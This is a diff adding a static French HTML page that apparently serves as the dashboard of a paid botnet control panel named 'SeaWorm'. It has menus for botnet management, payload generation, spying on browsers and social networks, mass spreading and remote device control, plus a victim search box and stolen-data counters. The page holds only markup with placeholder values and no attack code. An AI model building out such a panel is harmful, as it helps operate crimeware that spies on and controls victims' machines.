@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="index.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css"
+        integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <title>Document</title>
+</head>
+
+<body>
+    <main>
+        <div class="panel-right">
+
+            <div class="logo">
+                <h1>SeaWorm</h1>
+                <div class="line"></div>
+            </div>
+
+            <div class="panel-content">
+                <div class="general">
+                    <h3 class="title-panel">Tableau de bord</h3>
+                    <div class="link-panel">
+                        <div class="first-link">
+                            <div class="circle" id="circle">
+                                <i class="fa-solid fa-database"></i>
+                            </div>
+                            <p id="first-link">General</p>
+                        </div>
+                        <div class="second-link">
+                            <ul>
+                                <li>
+                                    <i class="fa-solid fa-pen-to-square"></i>
+                                    <p>Génération</p>
+                                </li>
+                                <li>
+                                    <i class="fa-solid fa-sitemap"></i>
+                                    <p>Botnet</p>
+                                </li>
+                                <li>
+                                    <i class="fa-solid fa-gear"></i>
+                                    <p>Réglage</p>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                <div class="general">
+                    <h3 class="title-panel">Espionnage</h3>
+                    <div class="link-panel">
+                        <div class="second-link">
+                            <ul>
+                                <li>
+                                    <i class="fas fa-user"></i></i>
+                                    <p>Réseaux sociaux</p>
+                                </li>
+                                <li>
+                                    <i class="fas fa-magnifying-glass"></i>
+                                    <p>Navigateurs</p>
+                                </li>
+                                <li>
+                                    <i class="fas fa-hourglass-start"></i>
+                                    <p>Temps réel</p>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                <div class="general">
+                    <h3 class="title-panel">Partage de masse</h3>
+                    <div class="link-panel">
+                        <div class="second-link">
+                            <ul>
+                                <li>
+                                    <i class="fas fa-inbox"></i>
+                                    <p>Email</p>
+                                </li>
+                                <li>
+                                    <i class="fas fa-image"></i>
+                                    <p>Médias</p>
+                                </li>
+                                <li>
+                                    <i class="fas fa-sitemap"></i>
+                                    <p>Réseau</p>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                <div class="general">
+                    <h3 class="title-panel">Contrôle</h3>
+                    <div class="link-panel">
+                        <div class="second-link">
+                            <ul>
+                                <li><i class="fa-brands fa-chromecast"></i>
+                                    <p>Partage d'écran</p>
+                                </li>
+                                <li><i class="fas fa-mobile-button"></i>
+                                    <p>Appareils</p>
+                                </li>
+                                <li><i class="fa-solid fa-tower-broadcast"></i>
+                                    <p>Temps réel</p>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="panel-center">
+            <h1>Informations Général</h1>
+
+            <div class="first-case">
+                <div class="box  box-con">
+                    <div class="heade">
+                        <i class="fa-solid fa-computer"></i>
+                        <i class="fa-solid fa-ellipsis-vertical"></i>
+                    </div>
+                    <div class="body">
+                        <h2>0</h2>
+                        <p>Machine enregistrées</p>
+                    </div>
+                </div>
+                <div class="box  box-con">
+                    <div class="heade">
+                        <i class="fa-solid fa-layer-group"></i>
+                        <i class="fa-solid fa-ellipsis-vertical"></i>
+                    </div>
+                    <div class="body">
+                        <h2>0 Ko</h2>
+                        <p>Données récupérées</p>
+                    </div>
+                </div>
+                <div class="box  box-con">
+                    <div class="heade">
+                        <i class="fa-solid fa-thumbs-up"></i>
+                        <i class="fa-solid fa-ellipsis-vertical"></i>
+                    </div>
+
+                    <div class="body">
+                        <h2>0</h2>
+                        <p>Réseaux enregistrées</p>
+                    </div>
+                </div>
+                <div class="box box-con need-help">
+                    <div class="heade">
+                        <i class="fa-solid fa-lightbulb need-help"></i>
+                        <i class="fa-solid fa-ellipsis-vertical"></i>
+                    </div>
+                    <div class="body">
+                        <p>Besoin d'aide?</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="seconde-case">
+                <div class="computer-save">
+                    <div class="head">
+                        <div class="title-box">
+                            <h3>Machines enregistrés</h3>
+                        </div>
+                        <p class="computer-description">Il vous reste <span id="reamingComputer"></span> machines.</p>
+                        <div class="progress">
+                            <span id="machineNumber"></span>
+                            <div class="progress-container">
+                                <div class="progress-bar" id="bar1"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="subscription-con">
+                    <div class="subscription">
+                        <div class="subscription-option" id="subscriptionOptions">
+                            <ul>
+                                <li>
+                                    <i class="fa-solid fa-credit-card"></i>
+                                    <p>Moyens de payements</p>
+                                </li>
+                                <li>
+                                    <i class="fa-solid fa-coins"></i>
+                                    <p>Crédit restant: 150</p>
+                                </li>
+                                <li>
+                                    <i class="fa-solid fa-circle-info"></i>
+                                    <p>Details abonnements</p>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="title">
+                            <p>Abonnement</p>
+                        </div>
+                        <div class="second-title">
+                            <p>Mensuel</p>
+                        </div>
+                        <i class="fa-solid fa-ellipsis-vertical" id="subscription"></i>
+                    </div>
+
+                    <p class="computer-description">Limite de <span id="limitComputer"></span> machines.</p>
+                    <div class="progress">
+                        <span id="machines_Number"></span>
+                        <div class="progress-container">
+                            <div class="progress-bar" id="bar2"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <h1>Logs</h1>
+
+            <div class="logs-con">
+                <div class="log-con">
+                    <div class="log-data">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Nom</th>
+                                    <th>IP</th>
+                                    <th>Action</th>
+                                    <th>Réponse</th>
+                                    <th>Date</th>
+                                    <th>Données</th>
+                                    <th>Résultat</th>
+                                </tr>
+                            </thead>
+                            <tbody class="log-body">
+                                <tr>
+                                    <td>Nom 1</td>
+                                    <td>123.456.789.0</td>
+                                    <td>Action 1</td>
+                                    <td>Réponse 1</td>
+                                    <td>Date 1</td>
+                                    <td>Données 1</td>
+                                    <td>Resultat 1</td>
+                                </tr>
+
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+        </div>
+        <div class="panel-left">
+            <div class="header">
+                <div class="dropdown-con">
+                    <div class="dropdown">
+                        <div class="select">
+                            <input type="text" id="search-input" placeholder="Rechercher une victime"
+                                autocomplete="off">
+                        </div>
+                        <input type="hidden" name="category">
+                        <div class="logs-con dropdown-menu">
+                            <div class="log-con">
+                                <div class="log-data">
+                                    <table>
+                                        <thead>
+                                            <tr>
+                                                <th>Nom</th>
+                                                <th>Date</th>
+                                                <th>Satut</th>
+                                                <th>Pays</th>
+                                                <th>Données</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody class="log-body list-device" id="log-body">
+
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="options">
+                    <i class="fa-solid fa-message"></i>
+                    <i class="fa-solid fa-bell"></i>
+                    <i class="fa-solid fa-gear"></i>
+                </div>
+            </div>
+            <div class="body">
+                <div class="line"></div>
+                <div class="profile">
+                    <img src="pp.png">
+                    <p>Punchnox</p>
+                </div>
+
+                <div class="info-account">
+                    <p>Version payante du logiciel <br>( limite de 50 machines )</p>
+                    <p>Vous êtes sur la whitelist</p>
+                </div>
+                <div class="line"></div>
+            </div>
+        </div>
+    </main>
+
+    <script src="index.js"></script>
+</body>
+
+</html>
